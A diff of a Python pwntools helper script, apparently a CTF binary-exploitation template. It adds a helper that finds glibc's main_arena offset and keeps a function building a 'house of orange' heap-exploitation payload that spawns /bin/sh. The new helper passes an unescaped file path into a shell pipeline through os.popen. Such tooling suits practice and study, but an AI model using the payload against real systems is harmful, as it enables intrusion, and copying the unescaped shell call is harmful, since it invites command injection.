@@ -73,9 +73,9 @@ def init_parser():
 
     (options, args) = parser.parse_args()
 
-    if options.remote:
-        options.local = False
-        options.remote = True
+    if options.local:
+        options.local = True
+        options.remote = False
     elif options.remote:
         options.local = False
         options.remote = True
@@ -117,6 +117,7 @@ def init_pwn(BIN_FILE = '',LIBC_FILE='',remote_detail=('127.0.0.1',23333),is_env
 
     return io,elf,libc
 
+# code by w1ther
 def house_of_orange(head_addr, system_addr, io_list_all):
     payload = b'/bin/sh\x00'
     payload = payload + p64(97) + p64(0) + p64(io_list_all - 16)
@@ -125,6 +126,24 @@ def house_of_orange(head_addr, system_addr, io_list_all):
     payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0
         ) + p64(18446744073709551615) + p64(0) * 2 + p64(head_addr + 12 * 8)
     return payload
+
+
+def get_main_arena(libc_file):
+    """
+    if libc arch is amd64-64
+
+    libc_file is libc path
+    return main_arean_offset
+    """
+    mallocHook = int(os.popen('objdump -j .data -d '+ str(libc_file)+'| grep "__malloc_hook" |cut -d" " -f 1').read(),16)
+    reallocHook = int(os.popen('objdump -j .data -d '+ str(libc_file)+'| grep "__realloc_hook"|cut -d" " -f 1').read(),16)
+
+
+    offset = mallocHook-reallocHook
+    main_arean_offset = hex(mallocHook + offset*2)
+    
+    log.success('main_arean_offset: {}'.format(main_arean_offset))
+    return main_arean_offset
 
 
 ru = lambda x : io.recvuntil(x)
